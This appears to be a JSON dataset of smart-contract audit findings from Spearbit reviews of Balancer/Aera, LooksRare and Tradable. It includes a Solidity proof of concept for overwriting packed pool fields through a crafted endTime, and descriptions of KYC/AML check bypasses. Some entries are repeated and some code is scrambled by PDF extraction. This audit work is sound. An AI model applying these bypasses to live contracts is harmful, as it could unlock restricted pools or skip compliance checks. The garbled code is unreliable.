console.log(\"Swap fee percentage\", decodeUint64(poolState, _SWAP_FEE_PERCENTAGE_OFFSET)); // 7 _SWAP_FEE_PERCENTAGE_OFFSET)); // 0 decodeUint64(miscData, due to miscData conversion } ,! }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Keep maximum allowed number of characters per line to 120.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "There are a few long lines in the code base. contracts/executionStrategies/StrategyCollectionOffer.sol 21:2 27:2 29:2 30:2 67:2 69:2 70:2 118:2 119:2 error error error error error error error error error Line length must be no more than 120 but current length is 127 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length contracts/executionStrategies/StrategyDutchAuction.sol 20:2 22:2 23:2 26:5 70:31 85:2 86:2 92:5 error error error warning warning error error warning Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 9 but allowed no more than 7 Avoid to make time-based decisions in your business logic Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 8 but allowed no more than 7 max-line-length max-line-length max-line-length code-complexity not-rely-on-time max-line-length max-line-length code-complexity contracts/executionStrategies/StrategyItemIdsRange.sol 15:2 20:2 21:2 22:2 23:2 25:5 100:2 101:2 error error error error error warning error error Line length must be no more than 120 but current length is 142 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 12 but allowed no more than 7 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length code-complexity max-line-length max-line-length contracts/helpers/OrderValidatorV2A.sol 40:2 ,! 53:2 ,! error Line length must be no more than 120 but current length is 121 error Line length must be no more than 120 but current length is 121 max-line-length max-line-length 69 225:2 ,! 279:2 ,! 498:24 ,! 501:26 ,! 511:2 ,! 593:5 ,! 662:5 ,! 758:5 ,! 830:5 ,! 843:17 ,! 850:17 ,! 906:5 ,! 963:5 ,! 12:2 ,! 18:2 ,! 23:2 ,! 49:5 ,! 81:2 ,! 144:2 ,! error Line length must be no more than 120 but current length is 127 max-line-length error Line length must be no more than 120 but current length is 127 max-line-length warning Avoid to make time-based decisions in your business logic not-rely-on-time warning Avoid to make time-based decisions in your business logic not-rely-on-time error Line length must be no more than 120 but current length is 143 max-line-length warning Function has cyclomatic complexity 9 but allowed no more than 7 warning Function has cyclomatic complexity 9 but allowed no more than 7 code-complexity code-complexity warning Function order is incorrect, internal view function can not go after internal pure function (line 727) ordering warning Function has cyclomatic complexity 10 but allowed no more than 7 code-complexity warning Avoid to use inline assembly. It is acceptable only in rare cases no-inline-assembly warning Avoid to use inline assembly. It is acceptable only in rare cases warning Function has cyclomatic complexity 8 but allowed no more than 7 no-inline-assembly warning Function has cyclomatic complexity 8 but allowed no more than 7 code-complexity code-complexity contracts/helpers/ValidationCodeConstants.sol 17:2 18:2 error error Line length must be no more than 120 but current length is 129 Line length must be no more than 120 but current length is 121 max-line-length max-line-length contracts/interfaces/ILooksRareProtocol.sol 160:2 error Line length must be no more than 120 but current length is 122 max-line-length contracts/libraries/OrderStructs.sol error Line length must be no more than 120 but current length is 292 max-line-length error Line length must be no more than 120 but current length is 292 error Line length must be no more than 120 but current length is 127 max-line-length max-line-length warning Function order is incorrect, struct definition can not go after state variable declaration (line 26) ordering error Line length must be no more than 120 but current length is 128 max-line-length error Line length must be no more than 120 but current length is 131 max-line-length 49 problems (34 errors, 15 warnings)",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Important Balancer fields can be overwritten by EndTime",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Balancers ManagedPool uses 32 bit values for startTime and endTime but it does not verify if those values exist within that range. Values are stored in a 32-byte _miscData slot in BasePool via the insertUint32() function. Nevertheless, this function does not strip any excess bits, resulting in other fields stored in _miscData to be overwritten. In the version that Aera Vault uses only the \"restrict LP\" field can be overwritten and by carefully crafting the value of endTime, the \"restrict LP\" boolean can be switched off, allowing anyone to use joinPool. The Manager could cause this behavior via the updateWeightsGradually() function while the Owner could do it via enableTradingWithWeights(). Note: This issue has been reported to Balancer by the Spearbit team. contract ManagedPool is BaseWeightedPool, ReentrancyGuard { // f14de92ac443d6daf1f3a42025b1ecdb8918f22e 32 bits | 1 bit 1 bit | | restrict LP | end time 32 bits | ] 7 bits | start time | total tokens | swap flag ] | // [ 64 bits // [ reserved | // |MSB | 119 bits | unused function _startGradualWeightChange(uint256 startTime, uint256 endTime, ... ) ... { ... _setMiscData( _getMiscData().insertUint32(startTime, _START_TIME_OFFSET).insertUint32(endTime, ,! _END_TIME_OFFSET) ); // this convert the values to 32 bits ... } } In the latest version of ManagedPool many more fields can be overwritten, including:  LP flag  Fee end/Fee start  Swap flag contract ManagedPool is BaseWeightedPool, AumProtocolFeeCache, ReentrancyGuard { // current version // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB 1 bit | 31 bits | | 31 bits 64 bits | 32 bits | 32 bits 1 bit | | The following POC shows how fields can be manipulated. // SPDX-License-Identifier: MIT pragma solidity ^0.8.13; import \"hardhat/console.sol\"; contract checkbalancer { uint256 private constant _MASK_1 = 2**(1) - 1; uint256 private constant _MASK_31 = 2**(31) - 1; uint256 private constant _MASK_32 = 2**(32) - 1; uint256 private constant _MASK_64 = 2**(64) - 1; uint256 private constant _MASK_192 = 2**(192) - 1; 5 | | 1 bit 64 bits | | 31 bits 1 bit | 31 bits | // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB uint256 private constant _WEIGHT_START_TIME_OFFSET = 0; uint256 private constant _WEIGHT_END_TIME_OFFSET = 32; uint256 private constant _END_SWAP_FEE_PERCENTAGE_OFFSET = 64; uint256 private constant _FEE_START_TIME_OFFSET = 128; uint256 private constant _SWAP_ENABLED_OFFSET = 159; uint256 private constant _FEE_END_TIME_OFFSET = 160; uint256 private constant _MUST_ALLOWLIST_LPS_OFFSET = 191; uint256 private constant _SWAP_FEE_PERCENTAGE_OFFSET = 192; 32 bits | 32 bits function insertUint32(bytes32 word,uint256 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_32 << offset)); return clearedWord | bytes32(value << offset); } function decodeUint31(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_31; } function decodeUint32(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_32; } function decodeUint64(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_64; } function decodeBool(bytes32 word, uint256 offset) internal pure returns (bool) { return (uint256(word >> offset) & _MASK_1) == 1; } function insertBits192(bytes32 word,bytes32 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_192 << offset)); return clearedWord | bytes32((uint256(value) & _MASK_192) << offset); } constructor() { bytes32 poolState; bytes32 miscData; uint startTime = 1 + 2*2**32; uint endTime = 3 + 4*2**32 + 5*2**(32+64) + 2**(32+64+31) + 6*2**(32+64+31+1) + ,! 2**(32+64+31+1+31) + 7*2**(32+64+31+1+31+1); poolState = insertUint32(poolState,startTime, _WEIGHT_START_TIME_OFFSET); poolState = insertUint32(poolState,endTime, _WEIGHT_END_TIME_OFFSET); miscData = insertBits192(miscData,poolState,0); decodeUint32(miscData, console.log(\"startTime\", console.log(\"endTime\", decodeUint32(miscData, console.log(\"endSwapFeePercentage\", decodeUint64(miscData, _WEIGHT_START_TIME_OFFSET)); // 1 // 3 _WEIGHT_END_TIME_OFFSET)); _END_SWAP_FEE_PERCENTAGE_OFFSET)); ,! // 4 console.log(\"Fee startTime\", console.log(\"Swap enabled\", console.log(\"Fee endTime\", console.log(\"AllowlistLP\", decodeUint31(miscData, decodeBool(miscData, decodeUint31(miscData, decodeBool(miscData, _FEE_START_TIME_OFFSET)); // 5 _SWAP_ENABLED_OFFSET)); // true _FEE_END_TIME_OFFSET)); // 6 _MUST_ALLOWLIST_LPS_OFFSET)); // ,! true console.log(\"Swap fee percentage\", console.log(\"Swap fee percentage\", decodeUint64(poolState, _SWAP_FEE_PERCENTAGE_OFFSET)); // 7 _SWAP_FEE_PERCENTAGE_OFFSET)); // 0 decodeUint64(miscData, due to miscData conversion } ,! }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Keep maximum allowed number of characters per line to 120.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "There are a few long lines in the code base. contracts/executionStrategies/StrategyCollectionOffer.sol 21:2 27:2 29:2 30:2 67:2 69:2 70:2 118:2 119:2 error error error error error error error error error Line length must be no more than 120 but current length is 127 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length contracts/executionStrategies/StrategyDutchAuction.sol 20:2 22:2 23:2 26:5 70:31 85:2 86:2 92:5 error error error warning warning error error warning Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 9 but allowed no more than 7 Avoid to make time-based decisions in your business logic Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 8 but allowed no more than 7 max-line-length max-line-length max-line-length code-complexity not-rely-on-time max-line-length max-line-length code-complexity contracts/executionStrategies/StrategyItemIdsRange.sol 15:2 20:2 21:2 22:2 23:2 25:5 100:2 101:2 error error error error error warning error error Line length must be no more than 120 but current length is 142 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 12 but allowed no more than 7 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length code-complexity max-line-length max-line-length contracts/helpers/OrderValidatorV2A.sol 40:2 ,! 53:2 ,! error Line length must be no more than 120 but current length is 121 error Line length must be no more than 120 but current length is 121 max-line-length max-line-length 69 225:2 ,! 279:2 ,! 498:24 ,! 501:26 ,! 511:2 ,! 593:5 ,! 662:5 ,! 758:5 ,! 830:5 ,! 843:17 ,! 850:17 ,! 906:5 ,! 963:5 ,! 12:2 ,! 18:2 ,! 23:2 ,! 49:5 ,! 81:2 ,! 144:2 ,! error Line length must be no more than 120 but current length is 127 max-line-length error Line length must be no more than 120 but current length is 127 max-line-length warning Avoid to make time-based decisions in your business logic not-rely-on-time warning Avoid to make time-based decisions in your business logic not-rely-on-time error Line length must be no more than 120 but current length is 143 max-line-length warning Function has cyclomatic complexity 9 but allowed no more than 7 warning Function has cyclomatic complexity 9 but allowed no more than 7 code-complexity code-complexity warning Function order is incorrect, internal view function can not go after internal pure function (line 727) ordering warning Function has cyclomatic complexity 10 but allowed no more than 7 code-complexity warning Avoid to use inline assembly. It is acceptable only in rare cases no-inline-assembly warning Avoid to use inline assembly. It is acceptable only in rare cases warning Function has cyclomatic complexity 8 but allowed no more than 7 no-inline-assembly code-complexity warning Function has cyclomatic complexity 8 but allowed no more than 7 code-complexity contracts/helpers/ValidationCodeConstants.sol 17:2 18:2 error error Line length must be no more than 120 but current length is 129 Line length must be no more than 120 but current length is 121 max-line-length max-line-length contracts/interfaces/ILooksRareProtocol.sol 160:2 error Line length must be no more than 120 but current length is 122 max-line-length contracts/libraries/OrderStructs.sol error Line length must be no more than 120 but current length is 292 error Line length must be no more than 120 but current length is 292 max-line-length max-line-length error Line length must be no more than 120 but current length is 127 max-line-length warning Function order is incorrect, struct definition can not go after state variable declaration (line 26) ordering error Line length must be no more than 120 but current length is 128 max-line-length error Line length must be no more than 120 but current length is 131 max-line-length 49 problems (34 errors, 15 warnings)",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Important Balancer fields can be overwritten by EndTime",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Balancers ManagedPool uses 32 bit values for startTime and endTime but it does not verify if those values exist within that range. Values are stored in a 32-byte _miscData slot in BasePool via the insertUint32() function. Nevertheless, this function does not strip any excess bits, resulting in other fields stored in _miscData to be overwritten. In the version that Aera Vault uses only the \"restrict LP\" field can be overwritten and by carefully crafting the value of endTime, the \"restrict LP\" boolean can be switched off, allowing anyone to use joinPool. The Manager could cause this behavior via the updateWeightsGradually() function while the Owner could do it via enableTradingWithWeights(). Note: This issue has been reported to Balancer by the Spearbit team. contract ManagedPool is BaseWeightedPool, ReentrancyGuard { // f14de92ac443d6daf1f3a42025b1ecdb8918f22e 32 bits | 1 bit | | restrict LP | end time 32 bits | ] 7 bits | start time | total tokens | swap flag ] 1 bit | // [ 64 bits // [ reserved | // |MSB | 119 bits | unused function _startGradualWeightChange(uint256 startTime, uint256 endTime, ... ) ... { ... _setMiscData( _getMiscData().insertUint32(startTime, _START_TIME_OFFSET).insertUint32(endTime, ,! _END_TIME_OFFSET) ); // this convert the values to 32 bits ... } } In the latest version of ManagedPool many more fields can be overwritten, including:  LP flag  Fee end/Fee start  Swap flag contract ManagedPool is BaseWeightedPool, AumProtocolFeeCache, ReentrancyGuard { // current version // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB 1 bit | 31 bits | | 31 bits 64 bits | 32 bits | 32 bits 1 bit | | The following POC shows how fields can be manipulated. // SPDX-License-Identifier: MIT pragma solidity ^0.8.13; import \"hardhat/console.sol\"; contract checkbalancer { uint256 private constant _MASK_1 = 2**(1) - 1; uint256 private constant _MASK_31 = 2**(31) - 1; uint256 private constant _MASK_32 = 2**(32) - 1; uint256 private constant _MASK_64 = 2**(64) - 1; uint256 private constant _MASK_192 = 2**(192) - 1; 5 | | 1 bit 64 bits | | 31 bits 1 bit | 31 bits | // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB uint256 private constant _WEIGHT_START_TIME_OFFSET = 0; uint256 private constant _WEIGHT_END_TIME_OFFSET = 32; uint256 private constant _END_SWAP_FEE_PERCENTAGE_OFFSET = 64; uint256 private constant _FEE_START_TIME_OFFSET = 128; uint256 private constant _SWAP_ENABLED_OFFSET = 159; uint256 private constant _FEE_END_TIME_OFFSET = 160; uint256 private constant _MUST_ALLOWLIST_LPS_OFFSET = 191; uint256 private constant _SWAP_FEE_PERCENTAGE_OFFSET = 192; 32 bits | 32 bits function insertUint32(bytes32 word,uint256 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_32 << offset)); return clearedWord | bytes32(value << offset); } function decodeUint31(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_31; } function decodeUint32(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_32; } function decodeUint64(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_64; } function decodeBool(bytes32 word, uint256 offset) internal pure returns (bool) { return (uint256(word >> offset) & _MASK_1) == 1; } function insertBits192(bytes32 word,bytes32 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_192 << offset)); return clearedWord | bytes32((uint256(value) & _MASK_192) << offset); } constructor() { bytes32 poolState; bytes32 miscData; uint startTime = 1 + 2*2**32; uint endTime = 3 + 4*2**32 + 5*2**(32+64) + 2**(32+64+31) + 6*2**(32+64+31+1) + ,! 2**(32+64+31+1+31) + 7*2**(32+64+31+1+31+1); poolState = insertUint32(poolState,startTime, _WEIGHT_START_TIME_OFFSET); poolState = insertUint32(poolState,endTime, _WEIGHT_END_TIME_OFFSET); miscData = insertBits192(miscData,poolState,0); decodeUint32(miscData, console.log(\"startTime\", console.log(\"endTime\", decodeUint32(miscData, console.log(\"endSwapFeePercentage\", decodeUint64(miscData, _WEIGHT_START_TIME_OFFSET)); // 1 // 3 _WEIGHT_END_TIME_OFFSET)); _END_SWAP_FEE_PERCENTAGE_OFFSET)); ,! // 4 console.log(\"Fee startTime\", console.log(\"Swap enabled\", console.log(\"Fee endTime\", console.log(\"AllowlistLP\", decodeUint31(miscData, decodeBool(miscData, decodeUint31(miscData, decodeBool(miscData, _FEE_START_TIME_OFFSET)); // 5 _SWAP_ENABLED_OFFSET)); // true _FEE_END_TIME_OFFSET)); // 6 _MUST_ALLOWLIST_LPS_OFFSET)); // ,! true console.log(\"Swap fee percentage\", console.log(\"Swap fee percentage\", decodeUint64(poolState, _SWAP_FEE_PERCENTAGE_OFFSET)); // 7 _SWAP_FEE_PERCENTAGE_OFFSET)); // 0 decodeUint64(miscData, due to miscData conversion } ,! }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Bypass of EntityType check when null attribute is returned by Quadrata",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "In QuadrataKYCVerifier when a deal's EntityType requirement is set to Individual or Business and Quadrata returns a null business attribute (all fields bytes32(0)) then the EntityType requirement check is bypassed. The EntityType requirement check looks like this: if (requirements.entityType != IQuadrataKYCVerifier.EntityType.Any) { bool isBusiness = businessAttribute.value.isBusinessEqual(true) && !_isExpired(investorAttribute, ,! maxAllowedAttributeAge); if (requirements.entityType == EntityType.Individual && isBusiness) { revert EntityTypeCheckFailed(deal, account); } if (requirements.entityType == EntityType.Business && !isBusiness) { revert EntityTypeCheckFailed(deal, account); } } The issue arises when:  An account's didAttribute.value is not bytes32(0).  businessAttribute.value is bytes32(0).  Then businessAttribute.value.isBusinessEqual(true) will equate to false.  Due to the && operation _isExpired function won't be called-  Hence the isBusiness flag will become false.  Due to which the next if blocks (L141 - L147) won't be executed. Hence the EntityType requirement check gets bypassed for the account.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: High Risk"
        ]
    },
    {
        "title": "AML requirement checks skipped if no AML attribute for user",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "The _isExpired function returns false when attribute.epoch == 0 which happens when the attribute is missing and was not set by any Quadrata issuer. /// Checks if an attribute is expired. function _isExpired( IQuadPassportStore.Attribute memory attribute, uint256 maxAttributeAge ) { } internal view returns (bool) return attribute.epoch > 0 && attribute.epoch < block.timestamp - maxAttributeAge; The AML check is implemented as // Check: AML risk score. if ( !amlAttribute.value.amlLessThanEqual(requirements.maxAMLRiskScore) || _isExpired(amlAttribute, maxAllowedAttributeAge) ) { } revert AMLCheckFailed(deal, account); For a non-existent AML attribute, all amlAttribute values will be zero and the revert is never reached. If a deal requires an AML score of 5 or below and the investor has not performed KYC/AML checks they will still be able to invest in the deal.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: High Risk"
        ]
    },
    {
        "title": "InvestmentManager::_deleteOffer should subtract escrowAmount instead of $.offers[id].amount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "When an investor submits an offer to DealManager, the payment is initially escrowed, waiting for the offer to be reviewed by an Originator. If, after a delay of offerEscrowPeriod (initially 5 days), the offer is not reviewed, the investor can call withdrawOffer to get his funds back. However the accounting is incorrect in that case, since amount is deducted from the escrowed funds, whereas escrowAmount (amount + fees) has been escrowed. The surplus amount (equivalent to the fee), stays locked in the contract. hasSufficientAvailableFunds would deduct escrowedAmount from current contract balance to deter- mine the funds which can be distributed or withdrawn by admin.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Deal tokens are mistakenly burnt for all fiat accounts on principal payout",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "The principal payout distribution function can burn all fiat tokens unintentionally if the payoutAmount is set to a non-zero value, in a period where there are only fiat holders. The function calculation uses the _principalPayoutDistribution function, which differentiates the fiat payment amount and on chain payment amount. Due to incorrect logic, the function incorrectly burns the deal tokens for all fiat accounts, where none should be burnt. If you take a scenario in which every current holder or yield recipient is a fiat account, the calculations in the relevant context mentioned above is: fiatAccountsTotalBalance = fiat total balance onchainAccountsTotalBalance = totalSupply - fiat total balance = 0 fiatPayoutAmount = onchainAccountsTotalBalance==0, therefore = 0 These are used to construct a list of payouts -- addresses and amounts of tokens that should be burnt. Notably, the accountTokensToBurn is going to continue to increase and the principalPayouts continue to grow in size. function _principalPayoutDistribution( IDeal deal, uint256 payoutAmount ) { internal view returns (Payout[] memory principalPayouts, uint256 netPayoutAmount, uint256 tokensToBurn) uint256 totalSupply = deal.totalSupply(); if (totalSupply == 0) return (new Payout[](0), 0, 0); 7 // Compute the fiat accounts total balance, to infer total payout amount. uint256 fiatAccountsTotalBalance = deal.fiatAccountsTotalBalance(); uint256 onchainAccountsTotalBalance = totalSupply - fiatAccountsTotalBalance; uint256 fiatPayoutAmount = (onchainAccountsTotalBalance > 0) ? payoutAmount.mulDiv(fiatAccountsTotalBalance, onchainAccountsTotalBalance) : 0; // Calculate the total amount of tokens to burn. uint256 totalTokensToBurn = currencyToDealTokens(payoutAmount + fiatPayoutAmount); IDeal.TokenHolder[] memory dealHolders = deal.holders(); uint256 length = dealHolders.length; principalPayouts = new Payout[](length); for (uint256 i = 0; i < length; i++) { IDeal.TokenHolder memory holder = dealHolders[i]; // forgefmt: disable-next-item uint256 amount = holder.isFiatAccount ? 0 : holder.balance.mulDiv(payoutAmount, ,! onchainAccountsTotalBalance); netPayoutAmount += amount; uint256 accountTokensToBurn = holder.balance.mulDiv(totalTokensToBurn, totalSupply); tokensToBurn += accountTokensToBurn; principalPayouts[i] = Payout({ account: holder.account, amount: amount, burnTokenAmount: accountTokensToBurn, isFiatAccount: holder.isFiatAccount }); } } The function is called in the _initiatePrincipalPayout which will then iterate over all the payouts and start burning the respective token amount for all payouts -- which in this case, would include the payouts for all fiat accounts. Scenario: A deal is created, with only fiat holders. These newly created fiat accounts receives deal tokens in exchange for their fiat deposit. When the principal payout process starts, this function will burn all the on-chain deal tokens, despite the loan terms not ending. As a result, the principal and interest denominations between fiat accounts and on-chain accounts will also be mismatched.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "DealManager::initiatePrincipalPayout unbounded slippage on burnt tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "A total payout amount is computed off-chain and an amount proportional to the on-chain only pay- ment is passed as an argument to the call on DealManager::initiatePrincipalPayout. During execution, the total payout amount is reconstructed from the values of onChainTotalBalance, fiatTotalBalance and on chain payout. This total amount is used to determine the quantity of deal tokens to burn, but if the ratio has changed since the payoutAmount has been precomputed (some tokens are burnt or transferred), more tokens than needed will be burnt. Scenario:  Initial state: onChainTotalBalances = 1000 fiatTotalBalances = 1000 1. The originator computes a payout amount for a total payout of 1000, since onChainTotalBal- ances/totalSupply == 1/2, payoutAmount passed as an argument to initiatePrincipalPayout is 500. 2. The state changes, and 500 tokens are burnt from a on chain account. As a result the state is:  Intermediate state_ onChainTotalBalances = 500 fiatTotalBalances = 1000  The originator emits the computed transaction and as the ratios have changed, the total reconstructed payout is 1500 instead of 1000, and instead of half the tokens, all of the tokens are burnt. Note that the scenario likelihood is yet to determine, since only an originator can do all of the operations outlined above (initiatePrincipalPayout, burn or forceTransfer).",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Investors cannot receive their deposited principal or due interest if their deal requirement checks start failing",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "In PayoutManager contract the investor's eligibility check is performed when principal or interest is claimed for an investor.  The claimPayout reverts if checkAccountEligibility(msg.sender) reverts.  In _pushPayout the investor is skipped when isEligibleAccount(account) returns false. There could be scenarios where an investor was eligible when he deposited principal in a deal but going forward some of his quadrata attributes become invalid as per the deal's requirement. A simple example could be when a deal was set up to allow investors whose AML score is upto 3. An investor with AML score of 3 invests into the deal. After a while the investor's AML score increases to 4. Now neither that 9 investor nor the protocol admin can pull out the investor's deposited principal and due interest. This leads to loss of funds for the investor.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "payoutPeriodStartTime skips 1 second for payouts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "When yield is being distributed via PayoutManager._initiateInterestPayout, the deal admin specifies a period end time. The period start time is taken as the last end time + 1 in payoutPeriodStartTime. function payoutPeriodStartTime() public view returns (uint48) { PMStorage storage $ = _pmStorage(); // If there are no interest payouts yet, return the yield generation start. if ($.latestInterestPeriodEnd > 0) { return $.latestInterestPeriodEnd + 1; } // ... } The idea is that the timeline is perfectly subdivided into consecutive periods so no period can be missed. However, the new periods start at latestInterestPeriodEnd + 1, skipping the 1-second period from [latestInterestPe- riodEnd, latestInterestPeriodEnd + 1] each time when a yield distribution is made. This leads to unfair distributions and in the worst case, a yield recipient will not receive their yield. Example 1: Assume holders are entitled to yield from time t + 0 to t + 200 which hasn't been distributed yet. At t+101 a new investor joins the deal and is minted deal tokens, entitling them to yield for the period [t + 101, t + 200].  First, yield is distributed up to t + 100.  Afterwards, yield is distributed up to t + 200, note that this period is starting at payoutPeriodStartTime = t+101 instead of t+100.  The new investor will receive the same yield for the second distribution for the [t+100, t+200] period as an existing investor with the same balance. The existing investor should have received more yield for the second distribution as they held their deal token balance for 1 second longer (the period of [t + 100, t + 101]). Example 2: The contracts are intended to be deployed on zkSync. The block time on zkSync is 1 second: An L2 block is generated every 1 second, encompassing all transactions received within that timeframe. zkSync docs An investor joins the deal and is minted deal tokens at time t + 0. They exit the deal one second later at time t + 1 (force transfer, principal payout, etc.). If the previous yield distribution ended at t + 0 they won't receive any yield.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "QuadrataKYCVerifier::verifyEligibility wrong expiration check for businessAttribute",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "The following parameters are checked during KYC verification in QuadrataKYCVerifier.sol#L80-85:  s attributes from Quadrata. // Query the account bytes32[] memory attributesToQuery = new bytes32[](5); attributesToQuery[0] = QuadrataAttributes.DID; attributesToQuery[1] = QuadrataAttributes.COUNTRY; attributesToQuery[2] = QuadrataAttributes.AML; attributesToQuery[3] = QuadrataAttributes.IS_BUSINESS; attributesToQuery[4] = QuadrataAttributes.INVESTOR_STATUS; And for each of these parameters, a deadline is checked to ensure that the attribute is not expired. Here is an example to check expiry for the business attribute: bool isBusiness = businessAttribute.value.isBusinessEqual(true) && !_isExpired(investorAttribute, maxAllowedAttributeAge); //@audit: check expiry, but checked on wrong attribute ,! Unfortunately the expiry is checked on investorAttribute instead of businessAttribute which would lead to wrong validation of an expired businessAttribute.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Contracts do not support tokens with fees or rebasing tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "All these contracts assumes the payment currency is a standard-abiding ERC20, where there are no fees on transfer. Given Tradable Finance is considering DAI, USDC, and maybe USDT -- transfer amounts may not be exactly equal to expected values when transferring a token with fee. For example, while an investor is answering a capital call, the actual amount sent to the capital recipient may not match the cc.amount, when a portion of the transfer is given to the owner of USDT. Moreover, the fee recipient will also receive a smaller amount than intended after feeAmount has been transferred. In this particular example, the deal tokens minted to the investor are based on the amount transferred, without considering the amount lost by fees, which can result in a mismatch between deal tokens and the amount a user should have received, with the fee taken into consideration. 12 /// @notice Answers a capital call. /// @dev Handles the capital call answer and emits the /// @param id The capital call ID. function _answerCapitalCall(uint256 id) internal {  CapitalCallAnswered event.  [...] paymentCurrency.safeTransferFrom(msg.sender, capitalRecipient(), cc.amount); // Transfer fee amount from investor to fee recipient. if (cc.feeAmount > 0) paymentCurrency.safeTransferFrom(msg.sender, feeRecipient(), cc.feeAmount); // Finally mint the deal tokens to the investor. IDeal.Mint[] memory mints = new IDeal.Mint[](1); mints[0] = IDeal.Mint(msg.sender, currencyToDealTokens(cc.amount)); deal().mint(mints); emit CapitalCallAnswered(id, cc.investor, cc.amount, cc.feeAmount); } This may also result in unexpected behaviour with rebasing tokens, where balances and totalSupply adjust, how- ever does not seem to be as major of a concern, as Tradable is not considering adding these 